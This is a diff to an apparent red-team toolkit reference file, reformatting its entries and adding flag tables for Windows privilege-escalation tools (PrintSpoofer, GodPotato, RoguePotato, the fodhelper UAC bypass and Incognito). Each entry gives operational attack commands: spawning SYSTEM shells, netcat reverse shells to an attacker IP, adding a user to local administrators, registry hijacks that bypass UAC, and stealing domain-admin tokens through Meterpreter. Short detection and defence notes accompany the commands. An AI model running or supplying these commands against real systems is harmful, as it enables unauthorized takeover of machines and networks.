@@ -11778,275 +11778,421 @@ var TOOLKIT = [
               ]
       },
       {
-              "id": "printspoofer",
-              "name": "PrintSpoofer",
-              "url": "https://github.com/itm4n/PrintSpoofer",
-              "description": "SeImpersonate → SYSTEM via the print spooler's named pipe — the modern 'potato'.",
-              "brief": "PrintSpoofer escalates a service account that holds SeImpersonatePrivilege to SYSTEM. It coerces the print spooler service to connect to a named pipe the attacker controls, captures the spooler's SYSTEM token as it connects, and impersonates it to spawn a process as SYSTEM. It works on modern Windows where the older RPC/DCOM potatoes were mitigated.\n\nSeImpersonate is held by most service accounts — IIS application pools, MSSQL, and many others — so PrintSpoofer is the standard finisher after landing code execution as such a service. It needs the Spooler service running on the host.",
-              "quickReference": [
-                      {
-                              "label": "Spawn SYSTEM shell",
-                              "cmd": "PrintSpoofer.exe -i -c cmd"
-                      },
-                      {
-                              "label": "Run a command",
-                              "cmd": "PrintSpoofer.exe -c '<payload>'"
-                      },
-                      {
-                              "label": "Check the privilege first",
-                              "cmd": "whoami /priv | findstr SeImpersonate"
-                      }
+        "id": "printspoofer",
+        "name": "PrintSpoofer",
+        "url": "https://github.com/itm4n/PrintSpoofer",
+        "description": "SeImpersonate → SYSTEM via the print spooler's named pipe — the modern 'potato'.",
+        "brief": "PrintSpoofer escalates a service account that holds SeImpersonatePrivilege to SYSTEM. It coerces the print spooler service to connect to a named pipe the attacker controls, captures the spooler's SYSTEM token as it connects, and impersonates it to spawn a process as SYSTEM. It works on modern Windows where the older RPC/DCOM potatoes were mitigated.\n\nSeImpersonate is held by most service accounts — IIS application pools, MSSQL, and many others — so PrintSpoofer is the standard finisher after landing code execution as such a service. It needs the Spooler service running on the host.",
+        "quickReference": [
+          {
+            "label": "Spawn SYSTEM shell",
+            "cmd": "PrintSpoofer.exe -i -c cmd"
+          },
+          {
+            "label": "Run a command",
+            "cmd": "PrintSpoofer.exe -c '<payload>'"
+          },
+          {
+            "label": "Check the privilege first",
+            "cmd": "whoami /priv | findstr SeImpersonate"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Flags",
+            "type": "table",
+            "columns": [
+              "Flag",
+              "Description"
+            ],
+            "rows": [
+              [
+                "-i",
+                "Interactive — attach the new process to the current console"
               ],
-              "sections": [
-                      {
-                              "title": "Usage",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Confirm the privilege",
-                                              "cmd": "whoami /priv        # need SeImpersonatePrivilege = Enabled/Available"
-                                      },
-                                      {
-                                              "label": "Escalate to SYSTEM",
-                                              "cmd": "PrintSpoofer.exe -i -c cmd.exe         # interactive SYSTEM shell\nPrintSpoofer.exe -c 'nc.exe <ip> <port> -e cmd.exe'   # or run a payload"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "Named-pipe coercion to a local listener then a SYSTEM child process is the signal (Sysmon pipe + process events).",
-                                      "Needs the Spooler running. GodPotato / RoguePotato are alternatives when Spooler is disabled or on different builds."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "PrintSpoofer — GitHub (itm4n)",
-                                              "url": "https://github.com/itm4n/PrintSpoofer"
-                                      },
-                                      {
-                                              "label": "Theory — Windows Access Tokens & UAC",
-                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
-                                      }
-                              ]
-                      }
+              [
+                "-c \"<cmd>\"",
+                "Command to run as the resulting SYSTEM context"
+              ],
+              [
+                "-d <sessionId>",
+                "Spawn in a specific session (e.g. an RDP session)"
+              ],
+              [
+                "-p <program>",
+                "Program to launch (default cmd.exe)"
               ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Confirm the privilege",
+                "cmd": "whoami /priv        # need SeImpersonatePrivilege = Enabled/Available"
+              },
+              {
+                "label": "Escalate to SYSTEM",
+                "cmd": "PrintSpoofer.exe -i -c cmd.exe         # interactive SYSTEM shell\nPrintSpoofer.exe -c 'nc.exe <ip> <port> -e cmd.exe'   # or run a payload"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "Named-pipe coercion to a local listener then a SYSTEM child process is the signal (Sysmon pipe + process events).",
+              "Needs the Spooler running. GodPotato / RoguePotato are alternatives when Spooler is disabled or on different builds."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "PrintSpoofer — GitHub (itm4n)",
+                "url": "https://github.com/itm4n/PrintSpoofer"
+              },
+              {
+                "label": "Theory — Windows Access Tokens & UAC",
+                "url": "theory/2026-08-18-windows-tokens-uac.html"
+              }
+            ]
+          }
+        ]
       },
       {
-              "id": "godpotato",
-              "name": "GodPotato",
-              "url": "https://github.com/BeichenDream/GodPotato",
-              "description": "SeImpersonate → SYSTEM via a DCOM/RPC token trick that works across modern Windows builds.",
-              "brief": "GodPotato is a broadly-compatible member of the 'potato' family: it abuses a DCOM/RPC mechanism to obtain and impersonate a SYSTEM token from a service account holding SeImpersonatePrivilege, spawning a process as SYSTEM. Its selling point is coverage — it works across a wide range of Windows versions where earlier potatoes are patched, and it does not depend on the print spooler.\n\nReach for it when PrintSpoofer fails (Spooler disabled) or the target build is awkward. As with all potatoes, the prerequisite is a token that holds SeImpersonate.",
-              "quickReference": [
-                      {
-                              "label": "Run a command as SYSTEM",
-                              "cmd": "GodPotato.exe -cmd 'cmd /c whoami'"
-                      },
-                      {
-                              "label": "Spawn a shell",
-                              "cmd": "GodPotato.exe -cmd 'cmd /c nc.exe <ip> <port> -e cmd.exe'"
-                      }
+        "id": "godpotato",
+        "name": "GodPotato",
+        "url": "https://github.com/BeichenDream/GodPotato",
+        "description": "SeImpersonate → SYSTEM via a DCOM/RPC token trick that works across modern Windows builds.",
+        "brief": "GodPotato is a broadly-compatible member of the 'potato' family: it abuses a DCOM/RPC mechanism to obtain and impersonate a SYSTEM token from a service account holding SeImpersonatePrivilege, spawning a process as SYSTEM. Its selling point is coverage — it works across a wide range of Windows versions where earlier potatoes are patched, and it does not depend on the print spooler.\n\nReach for it when PrintSpoofer fails (Spooler disabled) or the target build is awkward. As with all potatoes, the prerequisite is a token that holds SeImpersonate.",
+        "quickReference": [
+          {
+            "label": "Run a command as SYSTEM",
+            "cmd": "GodPotato.exe -cmd 'cmd /c whoami'"
+          },
+          {
+            "label": "Spawn a shell",
+            "cmd": "GodPotato.exe -cmd 'cmd /c nc.exe <ip> <port> -e cmd.exe'"
+          },
+          {
+            "label": "Match the build to the host .NET",
+            "cmd": "# use GodPotato-NET2 / -NET35 / -NET4 to match the installed framework"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Flags",
+            "type": "table",
+            "columns": [
+              "Flag",
+              "Description"
+            ],
+            "rows": [
+              [
+                "-cmd \"<command>\"",
+                "Command line to run in the elevated context"
               ],
-              "sections": [
-                      {
-                              "title": "Usage",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Escalate",
-                                              "cmd": "GodPotato.exe -cmd 'cmd /c whoami'      # should print nt authority\\system\nGodPotato.exe -cmd 'cmd /c net localgroup administrators <you> /add'"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "Broad Windows coverage and no Spooler dependency. Signal: token manipulation + a SYSTEM child from a service process.",
-                                      "Defence: minimise accounts holding SeImpersonate; run services least-privileged; EDR generally flags known potato binaries."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "GodPotato — GitHub (BeichenDream)",
-                                              "url": "https://github.com/BeichenDream/GodPotato"
-                                      },
-                                      {
-                                              "label": "Theory — Windows Access Tokens & UAC",
-                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
-                                      }
-                              ]
-                      }
+              [
+                "-rpc_port <n>",
+                "Local RPC port to use (default is chosen automatically)"
               ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Escalate",
+                "cmd": "GodPotato.exe -cmd 'cmd /c whoami'      # should print nt authority\\system\nGodPotato.exe -cmd 'cmd /c net localgroup administrators <you> /add'"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "Broad Windows coverage and no Spooler dependency. Signal: token manipulation + a SYSTEM child from a service process.",
+              "Defence: minimise accounts holding SeImpersonate; run services least-privileged; EDR generally flags known potato binaries."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "GodPotato — GitHub (BeichenDream)",
+                "url": "https://github.com/BeichenDream/GodPotato"
+              },
+              {
+                "label": "Theory — Windows Access Tokens & UAC",
+                "url": "theory/2026-08-18-windows-tokens-uac.html"
+              }
+            ]
+          }
+        ]
       },
       {
-              "id": "roguepotato",
-              "name": "RoguePotato",
-              "url": "https://github.com/antonioCoco/RoguePotato",
-              "description": "SeImpersonate → SYSTEM via a redirected OXID resolver — the JuicyPotato successor.",
-              "brief": "RoguePotato is the successor to JuicyPotato for builds where Microsoft mitigated the original. It abuses DCOM/NTLM by redirecting the OXID resolver through an attacker-controlled RPC endpoint on port 135, recovering a SYSTEM token from a SeImpersonate-holding service account and impersonating it to run code as SYSTEM.\n\nIt typically needs a socat/network redirector so the OXID resolution reaches your fake resolver. Like the other potatoes, the prerequisite is SeImpersonatePrivilege; pick whichever potato works on the target's build.",
-              "quickReference": [
-                      {
-                              "label": "Run as SYSTEM",
-                              "cmd": "RoguePotato.exe -r <redirector_ip> -e '<payload>' -l 9999"
-                      },
-                      {
-                              "label": "Redirector (on your host)",
-                              "cmd": "socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999"
-                      }
+        "id": "roguepotato",
+        "name": "RoguePotato",
+        "url": "https://github.com/antonioCoco/RoguePotato",
+        "description": "SeImpersonate → SYSTEM via a redirected OXID resolver — the JuicyPotato successor.",
+        "brief": "RoguePotato is the successor to JuicyPotato for builds where Microsoft mitigated the original. It abuses DCOM/NTLM by redirecting the OXID resolver through an attacker-controlled RPC endpoint on port 135, recovering a SYSTEM token from a SeImpersonate-holding service account and impersonating it to run code as SYSTEM.\n\nIt typically needs a socat/network redirector so the OXID resolution reaches your fake resolver. Like the other potatoes, the prerequisite is SeImpersonatePrivilege; pick whichever potato works on the target's build.",
+        "quickReference": [
+          {
+            "label": "Run as SYSTEM",
+            "cmd": "RoguePotato.exe -r <redirector_ip> -e '<payload>' -l 9999"
+          },
+          {
+            "label": "Redirector (on your host)",
+            "cmd": "socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999"
+          },
+          {
+            "label": "Needs a redirector for port 135",
+            "cmd": "# RoguePotato relays the OXID resolver via your -r host back to -l"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Flags",
+            "type": "table",
+            "columns": [
+              "Flag",
+              "Description"
+            ],
+            "rows": [
+              [
+                "-r <ip>",
+                "Attacker OXID resolver / redirector IP"
               ],
-              "sections": [
-                      {
-                              "title": "Usage",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Set up the redirector and escalate",
-                                              "cmd": "# on the attacker host:\nsocat tcp-listen:135,reuseaddr,fork tcp:<target_ip>:9999\n# on the target (SeImpersonate service):\nRoguePotato.exe -r <attacker_ip> -e 'C:\\\\Windows\\\\System32\\\\cmd.exe' -l 9999"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "Requires port-135 redirection to your fake OXID resolver. Signal: DCOM/RPC anomalies + SYSTEM child process.",
-                                      "Try PrintSpoofer/GodPotato first — they need less setup; RoguePotato is the fallback for certain builds."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "RoguePotato — GitHub (antonioCoco)",
-                                              "url": "https://github.com/antonioCoco/RoguePotato"
-                                      },
-                                      {
-                                              "label": "Theory — Windows Access Tokens & UAC",
-                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
-                                      }
-                              ]
-                      }
+              [
+                "-e \"<cmd>\"",
+                "Command to execute in the elevated context"
+              ],
+              [
+                "-l <port>",
+                "Local port the fake OXID resolver listens on"
+              ],
+              [
+                "-c <CLSID>",
+                "DCOM CLSID to trigger"
+              ],
+              [
+                "-p <pipe>",
+                "Named pipe to use"
               ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Set up the redirector and escalate",
+                "cmd": "# on the attacker host:\nsocat tcp-listen:135,reuseaddr,fork tcp:<target_ip>:9999\n# on the target (SeImpersonate service):\nRoguePotato.exe -r <attacker_ip> -e 'C:\\\\Windows\\\\System32\\\\cmd.exe' -l 9999"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "Requires port-135 redirection to your fake OXID resolver. Signal: DCOM/RPC anomalies + SYSTEM child process.",
+              "Try PrintSpoofer/GodPotato first — they need less setup; RoguePotato is the fallback for certain builds."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "RoguePotato — GitHub (antonioCoco)",
+                "url": "https://github.com/antonioCoco/RoguePotato"
+              },
+              {
+                "label": "Theory — Windows Access Tokens & UAC",
+                "url": "theory/2026-08-18-windows-tokens-uac.html"
+              }
+            ]
+          }
+        ]
       },
       {
-              "id": "fodhelper",
-              "name": "Fodhelper UAC bypass",
-              "url": "https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/",
-              "description": "A LOLBin UAC bypass — auto-elevating binary that runs your command at high integrity via HKCU.",
-              "brief": "fodhelper.exe is a Windows 'Features on Demand' helper that auto-elevates (its manifest allows it to run high-integrity without a UAC prompt). It also reads a per-user registry key when launched. By planting a command under HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command and running fodhelper, an administrator running at medium integrity gets their payload executed at high integrity — a classic fileless UAC bypass using only built-in binaries.\n\nIt is not a privilege escalation across users — you must already be in the local Administrators group but running unelevated (the usual state after phishing an admin). It is the prerequisite step before credential dumping, which needs high integrity.",
-              "quickReference": [
-                      {
-                              "label": "Plant the hijack + trigger",
-                              "cmd": "reg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /d '<payload>' /f\nreg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /v DelegateExecute /f\nfodhelper.exe"
-                      },
-                      {
-                              "label": "Clean up",
-                              "cmd": "reg delete 'HKCU\\Software\\Classes\\ms-settings' /f"
-                      }
+        "id": "fodhelper",
+        "name": "Fodhelper UAC bypass",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/",
+        "description": "A LOLBin UAC bypass — auto-elevating binary that runs your command at high integrity via HKCU.",
+        "brief": "fodhelper.exe is a Windows 'Features on Demand' helper that auto-elevates (its manifest allows it to run high-integrity without a UAC prompt). It also reads a per-user registry key when launched. By planting a command under HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command and running fodhelper, an administrator running at medium integrity gets their payload executed at high integrity — a classic fileless UAC bypass using only built-in binaries.\n\nIt is not a privilege escalation across users — you must already be in the local Administrators group but running unelevated (the usual state after phishing an admin). It is the prerequisite step before credential dumping, which needs high integrity.",
+        "quickReference": [
+          {
+            "label": "Plant the hijack + trigger",
+            "cmd": "reg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /d '<payload>' /f\nreg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /v DelegateExecute /f\nfodhelper.exe"
+          },
+          {
+            "label": "Clean up",
+            "cmd": "reg delete 'HKCU\\Software\\Classes\\ms-settings' /f"
+          },
+          {
+            "label": "Same idea, different binary",
+            "cmd": "# computerdefaults.exe reads the same ms-settings handler as fodhelper"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Related auto-elevating LOLBins",
+            "type": "table",
+            "columns": [
+              "Binary",
+              "Handler it reads from HKCU"
+            ],
+            "rows": [
+              [
+                "fodhelper.exe",
+                "ms-settings shell\\open\\command (the common one)"
               ],
-              "sections": [
-                      {
-                              "title": "Usage",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Full bypass",
-                                              "cmd": "reg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /ve /d 'cmd.exe /c <payload>' /f\nreg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /v 'DelegateExecute' /f\nfodhelper.exe        # spawns the payload high-integrity, no UAC prompt\nreg delete 'HKCU\\Software\\Classes\\ms-settings' /f   # cleanup"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "Signal: auto-elevating binaries (fodhelper/computerdefaults/wsreset) spawning odd children; HKCU ms-settings class writes.",
-                                      "Defence: set UAC to 'always notify'; monitor the known hijack registry paths. Many bypasses exist — wsreset, computerdefaults, sdclt — rotate if one is blocked."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "LOLBAS — Fodhelper",
-                                              "url": "https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/"
-                                      },
-                                      {
-                                              "label": "Theory — Windows Access Tokens & UAC",
-                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
-                                      }
-                              ]
-                      }
+              [
+                "computerdefaults.exe",
+                "Also the ms-settings handler"
+              ],
+              [
+                "sdclt.exe",
+                "App Paths / IsolatedCommand"
+              ],
+              [
+                "slui.exe",
+                ".exe / URL handler hijack"
+              ],
+              [
+                "eventvwr.exe",
+                "mscfile handler (patched on modern Windows)"
               ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Full bypass",
+                "cmd": "reg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /ve /d 'cmd.exe /c <payload>' /f\nreg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /v 'DelegateExecute' /f\nfodhelper.exe        # spawns the payload high-integrity, no UAC prompt\nreg delete 'HKCU\\Software\\Classes\\ms-settings' /f   # cleanup"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "Signal: auto-elevating binaries (fodhelper/computerdefaults/wsreset) spawning odd children; HKCU ms-settings class writes.",
+              "Defence: set UAC to 'always notify'; monitor the known hijack registry paths. Many bypasses exist — wsreset, computerdefaults, sdclt — rotate if one is blocked."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "LOLBAS — Fodhelper",
+                "url": "https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/"
+              },
+              {
+                "label": "Theory — Windows Access Tokens & UAC",
+                "url": "theory/2026-08-18-windows-tokens-uac.html"
+              }
+            ]
+          }
+        ]
       },
       {
-              "id": "incognito",
-              "name": "Incognito",
-              "url": "https://github.com/CyberVaca/incognito",
-              "description": "Token impersonation — steal and reuse a privileged token already present on the host.",
-              "brief": "Incognito enumerates the access tokens present on a compromised host and lets you impersonate them. When a privileged user (a Domain Admin, a service account) has logged on or has a process running, their token is available in memory; if you are SYSTEM/high-integrity you can duplicate and assume it to act as that user — without their password or hash.\n\nIt is the classic 'hunt a DA session then steal their token' finisher: list delegation tokens, find a privileged one, impersonate it, and use the borrowed identity to move laterally or reach the DC. It ships standalone and as a Meterpreter extension.",
-              "quickReference": [
-                      {
-                              "label": "List available tokens",
-                              "cmd": "incognito.exe list_tokens -u"
-                      },
-                      {
-                              "label": "Impersonate a token",
-                              "cmd": "incognito.exe execute -c '<DOMAIN>\\<user>' cmd.exe"
-                      },
-                      {
-                              "label": "In Meterpreter",
-                              "cmd": "load incognito ; list_tokens -u ; impersonate_token '<DOMAIN>\\\\<user>'"
-                      }
+        "id": "incognito",
+        "name": "Incognito",
+        "url": "https://github.com/CyberVaca/incognito",
+        "description": "Token impersonation — steal and reuse a privileged token already present on the host.",
+        "brief": "Incognito enumerates the access tokens present on a compromised host and lets you impersonate them. When a privileged user (a Domain Admin, a service account) has logged on or has a process running, their token is available in memory; if you are SYSTEM/high-integrity you can duplicate and assume it to act as that user — without their password or hash.\n\nIt is the classic 'hunt a DA session then steal their token' finisher: list delegation tokens, find a privileged one, impersonate it, and use the borrowed identity to move laterally or reach the DC. It ships standalone and as a Meterpreter extension.",
+        "quickReference": [
+          {
+            "label": "List available tokens",
+            "cmd": "incognito.exe list_tokens -u"
+          },
+          {
+            "label": "Impersonate a token",
+            "cmd": "incognito.exe execute -c '<DOMAIN>\\<user>' cmd.exe"
+          },
+          {
+            "label": "In Meterpreter",
+            "cmd": "load incognito ; list_tokens -u ; impersonate_token '<DOMAIN>\\\\<user>'"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Commands",
+            "type": "table",
+            "columns": [
+              "Command",
+              "Description"
+            ],
+            "rows": [
+              [
+                "list_tokens -u",
+                "List available tokens grouped by user (-g groups by group)"
               ],
-              "sections": [
-                      {
-                              "title": "Usage",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Find and assume a privileged token",
-                                              "cmd": "incognito.exe list_tokens -u                       # enumerate by user\nincognito.exe execute -c '<DOMAIN>\\Administrator' cmd.exe"
-                                      },
-                                      {
-                                              "label": "Meterpreter workflow",
-                                              "cmd": "meterpreter > load incognito\nmeterpreter > list_tokens -u\nmeterpreter > impersonate_token '<DOMAIN>\\\\<da_user>'"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "Requires SYSTEM/high integrity and a privileged token present on the box — pair with 'hunt for a DA session'.",
-                                      "Signal: token manipulation and cross-session process access. Defence: tiered admin (DAs never log on to lower-tier hosts), credential guard."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "Incognito — GitHub",
-                                              "url": "https://github.com/CyberVaca/incognito"
-                                      },
-                                      {
-                                              "label": "Theory — Windows Access Tokens & UAC",
-                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
-                                      }
-                              ]
-                      }
+              [
+                "execute -c \"<DOMAIN\\user>\" <cmd>",
+                "Impersonate the named token and run a command"
+              ],
+              [
+                "add_user <user> <pass>",
+                "Create a user (needs the rights of an impersonated token)"
+              ],
+              [
+                "add_localgroup_user <group> <user>",
+                "Add a user to a local group"
+              ],
+              [
+                "snarf_hashes",
+                "Collect hashes from the tokens available on the host"
               ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Find and assume a privileged token",
+                "cmd": "incognito.exe list_tokens -u                       # enumerate by user\nincognito.exe execute -c '<DOMAIN>\\Administrator' cmd.exe"
+              },
+              {
+                "label": "Meterpreter workflow",
+                "cmd": "meterpreter > load incognito\nmeterpreter > list_tokens -u\nmeterpreter > impersonate_token '<DOMAIN>\\\\<da_user>'"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "Requires SYSTEM/high integrity and a privileged token present on the box — pair with 'hunt for a DA session'.",
+              "Signal: token manipulation and cross-session process access. Defence: tiered admin (DAs never log on to lower-tier hosts), credential guard."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "Incognito — GitHub",
+                "url": "https://github.com/CyberVaca/incognito"
+              },
+              {
+                "label": "Theory — Windows Access Tokens & UAC",
+                "url": "theory/2026-08-18-windows-tokens-uac.html"
+              }
+            ]
+          }
+        ]
       },
       {
               "id": "sharpdpapi",
